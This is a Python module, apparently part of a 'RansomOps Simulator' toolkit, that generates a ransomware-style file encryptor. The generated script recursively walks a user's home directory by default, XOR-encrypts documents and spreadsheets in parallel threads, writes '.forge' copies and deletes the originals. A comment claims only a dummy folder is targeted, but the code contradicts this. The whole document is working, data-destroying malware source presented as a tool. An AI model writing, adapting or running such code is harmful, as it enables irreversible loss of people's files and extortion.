"""
The Forge — RansomOps Simulator
Lethal and hyper-fast file encryptor module (Educational/Red Team simulation).
"""

import textwrap
import hashlib

def generate_python(public_key: str = "forge_pub_key", extensions: str = "txt,doc,docx,xls,xlsx,pdf", speed: str = "fast") -> str:
    """Python-based fast file encryptor."""
    # Convert extensions to list literal
    ext_list = [f".{e.strip()}" for e in extensions.split(",")]
    
    code = textwrap.dedent(f"""\
        import os
        import threading
        
        # Generated by The Forge
        EXTENSIONS = {ext_list}
        KEY = "{public_key}".encode()
        MARKER = b"\\xDE\\xAD\\xBE\\xEF"
        
        def _xor_crypt(data: bytes) -> bytes:
            return bytes(data[i] ^ KEY[i % len(KEY)] for i in range(len(data)))

        def process_file(filepath):
            try:
                with open(filepath, "rb") as f:
                    data = f.read()
                
                # Check if already encrypted
                if data.startswith(MARKER): return
                
                enc = MARKER + _xor_crypt(data)
                
                with open(filepath + ".forge", "wb") as f:
                    f.write(enc)
                os.remove(filepath)
            except Exception:
                pass

        def discover_and_execute(root_dir="C:\\\\Users"):
            threads = []
            for root, dirs, files in os.walk(root_dir):
                for file in files:
                    if any(file.endswith(ext) for ext in EXTENSIONS):
                        t = threading.Thread(target=process_file, args=(os.path.join(root, file),))
                        threads.append(t)
                        t.start()
                        
                        # Throttle threads slightly for 'fast' setting so it doesn't crash system
                        if len(threads) > 100:
                            for th in threads: th.join()
                            threads = []
                            
            for th in threads: th.join()

        if __name__ == "__main__":
            # Only target dummy data folder on standard red team execution to prevent actual data destruction, 
            # unless path is overridden
            search_path = os.environ.get("FORGE_TARGET_DIR", os.path.expanduser("~"))
            discover_and_execute(search_path)
    """)
    return code

VARIANTS = {
    "python": generate_python,
}

def generate(language: str = "python", **kwargs) -> str:
    return VARIANTS[language](**kwargs)

def list_variants() -> list[str]:
    return list(VARIANTS.keys())
